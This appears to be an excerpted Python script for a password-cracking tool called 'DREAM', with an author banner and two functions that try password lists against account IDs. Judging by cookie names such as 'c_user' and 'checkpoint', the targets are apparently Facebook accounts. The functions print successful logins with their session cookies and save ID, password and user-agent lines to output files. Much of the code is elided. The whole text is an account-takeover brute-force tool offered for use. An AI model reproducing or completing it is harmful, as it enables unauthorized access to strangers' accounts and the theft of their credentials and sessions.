...
def look():
    ...
    print("""                                    
\x1b[1;97m          
d8888b. d8888b. d88888b  .d8b.  .88b  d88. 
88  `8D 88  `8D 88'     d8' `8b 88'YbdP`88 
88   88 88oobY' 88ooooo 88ooo88 88  88  88 
88   88 88`8b   88~~~~~ 88~~~88 88  88  88 
88  .8D 88 `88. 88.     88   88 88  88  88 
Y8888D' 88   YD Y88888P YP   YP YP  YP  YP                                
--------------------------------------
 [*] Author   : Azan Ali
 [*] GitHub   : Harr456
 [*] TOOL     : FREE
...
def crack(idf,pwv,nmf):
    ...
    sys.stdout.write(f"\r {P}[DREAM] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[DREAM-CP] {idf}|{pw}')
                ...
                print(f'\r\33[92m[DREAM-OK] {idf}|{pw} | {kuki}')
...
def crack2(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[DREAM-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
